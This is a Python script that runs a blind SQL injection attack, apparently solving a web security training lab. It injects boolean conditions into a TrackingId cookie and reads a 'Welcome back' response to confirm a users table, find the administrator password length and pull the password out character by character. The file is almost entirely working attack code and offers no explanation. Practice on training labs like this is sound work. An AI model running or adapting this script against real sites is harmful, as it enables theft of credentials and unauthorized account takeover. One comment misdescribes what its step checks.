import requests

# Target URL
base_url = "https://0a1c007f03e68c6a80084e08007400a3.web-security-academy.net"

def get_initial_tracking_id():
    response = requests.get(base_url)
    if 'TrackingId' in response.cookies:
        return response.cookies['TrackingId']

def send_request(tracking_id, payload):
    cookies = {'TrackingId': f"{tracking_id}' {payload}"}
    response = requests.get(base_url, cookies=cookies)
    return response.text

if __name__ == "__main__":
    tracking_id = get_initial_tracking_id()

    # Step 1: Validate the existence of the "users" table
    response = send_request(tracking_id, "AND (SELECT 'a' FROM users LIMIT 1)='a")
    if "Welcome back!" in response:
        print("Table 'users' exists.")
    else:
        print("Table 'users' does not exist.")

    # Step 2: Validate columns "username" and "password" existence
    response = send_request(tracking_id, "AND (SELECT 'a' FROM users WHERE username='administrator')='a")
    if "Welcome back" in response:
        print("Columns 'username' and 'password' exist.")
    else:
        print("Columns 'username' and 'password' do not exist.")

    # Step 3: Determine the password length for "administrator"
    password_length = 0
    while True:
        payload = f"AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{password_length})='a"
        response = send_request(tracking_id, payload)
        if "Welcome back" in response:
            password_length += 1
        else:
            break
    print("Password length:", password_length)

    # Step 4: Extract the password for the user "administrator"
    password = ""
    for i in range(1, password_length + 1):
        for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
            payload = f"AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}"
            response = send_request(tracking_id, payload)
            if "Welcome back" in response:
                password += char
                break
    print(f"Password for 'administrator': {password}")
